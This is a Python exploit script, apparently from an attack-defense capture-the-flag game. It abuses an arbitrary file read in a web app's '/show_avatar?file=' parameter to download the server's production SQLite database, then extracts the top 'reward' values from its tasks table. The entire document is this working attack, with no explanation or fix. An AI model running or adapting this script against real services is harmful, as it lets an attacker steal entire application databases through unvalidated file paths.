#!/usr/bin/env python3

import tempfile
import requests
import sqlite3
import sys


HOST = sys.argv[1]
PORT = 3000


def main():

    try:
        resp = requests.get(f"http://{HOST}:{PORT}/show_avatar?file=/rails/storage/production.sqlite3", timeout=10)

        with tempfile.NamedTemporaryFile(suffix=".sqlite3", delete=True) as tmp:
            tmp.write(resp.content)
            tmp.flush()

            with sqlite3.connect(tmp.name) as conn:
                cur = conn.execute("SELECT reward FROM tasks ORDER BY reward DESC LIMIT 10;")
                rows = cur.fetchall()
                print([row[0] for row in rows], flush=True)

    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()

